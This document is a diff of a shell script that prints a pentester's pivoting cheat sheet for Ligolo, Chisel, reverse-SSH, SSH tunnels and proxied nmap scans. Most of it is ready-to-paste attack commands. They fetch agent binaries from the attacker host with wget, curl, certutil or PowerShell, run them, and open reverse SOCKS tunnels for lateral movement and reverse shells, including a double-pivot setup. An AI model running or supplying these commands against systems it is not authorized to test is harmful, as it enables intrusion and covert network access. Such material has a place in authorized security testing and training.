@@ -36,8 +36,8 @@ EOF
 echo -e "LHOST=${GREEN}$LHOST${NC}"
 echo -e "TOOLS_PORT=${GREEN}$TOOLS_PORT${NC}"
 echo
-echo
 
+echo
 echo '********** Ligolo 🚀**********'
 echo
 echo "# Starting the proxy"
@@ -53,30 +53,39 @@ echo "wget -O /tmp/agent http://$LHOST:$TOOLS_PORT/pivoting/ligolo/linux/agent &
 echo
 echo "curl -L -o /tmp/agent http://$LHOST:$TOOLS_PORT/pivoting/ligolo/linux/agent && chmod +x /tmp/agent && /tmp/agent -connect $LHOST:9001 -ignore-cert"
 echo
-echo
 
 echo
 echo '********** Chisel ⛏️**********'
 echo
 echo "# Starting the server"
-echo "./chisel server --port 8888 --reverse"
+echo "./chisel server --port 8001 --reverse"
 echo
 echo "# Windows"
-echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe C:\Windows\Temp\chisel.exe && C:\Windows\Temp\chisel.exe client $LHOST:8888 R:1080:socks"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe C:\Windows\Temp\chisel.exe && C:\Windows\Temp\chisel.exe client $LHOST:8001 R:1080:socks"
 echo
-echo "iwr -Uri http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe -OutFile C:\Windows\Temp\chisel.exe | & C:\Windows\Temp\chisel.exe client $LHOST:8888 R:1080:socks"
+echo "iwr -Uri http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe -OutFile C:\Windows\Temp\chisel.exe | & C:\Windows\Temp\chisel.exe client $LHOST:8001 R:1080:socks"
 echo
 echo "# Linux"
-echo "wget -O /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
+echo "wget -O /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8001 R:1080:socks"
 echo
-echo "curl -L -o /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
+echo "curl -L -o /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8001 R:1080:socks"
 echo
 echo "# Send our reverse shells to the pivot machines IP using port 8080 which would hit our listener on kali over port 1337"
-echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe C:\Windows\Temp\chisel.exe && C:\Windows\Temp\chisel.exe server -p 8888 --reverse"
-echo "chisel client <target>:8888 R:8080:127.0.0.1:1337"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe C:\Windows\Temp\chisel.exe && C:\Windows\Temp\chisel.exe server -p 8001 --reverse"
 echo
+echo "Common scenarios"
 echo
-
+echo "chisel client $LHOST:8001 R:8080:127.0.0.1:1337"
+echo
+echo Double pivot
+echo ".\chisel.exe client $LHOST:8001 R:1080:socks"           # Attacker machine
+echo ".\chisel.exe server --port 8002 --reverse"              # Webserver (reachable from attacker)
+echo ".\chisel.exe client 192.168.100.135:8002 R:2080:socks"  # Unreachable from attacker
+echo
+echo "[ProxyList]"
+echo "socks5 127.0.0.1 1080"
+echo "socks5 127.0.0.1 2080"
+echo
 echo '********** Reverse-SSH (password is password) 🚀**********'
 echo
 echo "# Windows"
@@ -95,8 +104,8 @@ echo
 echo "# Forward dynamic socks proxy"
 echo "ssh -f -N -D 127.0.0.1:1080 user@<target> -p 31337"
 echo
-echo
 
+echo
 echo '********** SSH 🤓**********'
 echo
 echo "Local port to remote port"
@@ -116,8 +125,8 @@ echo
 echo "# Using the dynamic proxy"
 echo "proxychains4 -f proxychains.conf curl http://127.0.0.1:8080"
 echo
-echo
 
+echo
 echo '********** NMAP **********'
 echo
 echo "# Quick nmap scan of internal network"
@@ -126,6 +135,5 @@ echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT --top-ports=100 
 echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT --top-ports=1000 --open 192.168.100.10"
 echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT --top-ports=1000 --open 192.168.100.10"
 echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT -p8000,8888,3333 --open 192.168.100.10"
-echo
 echo
 
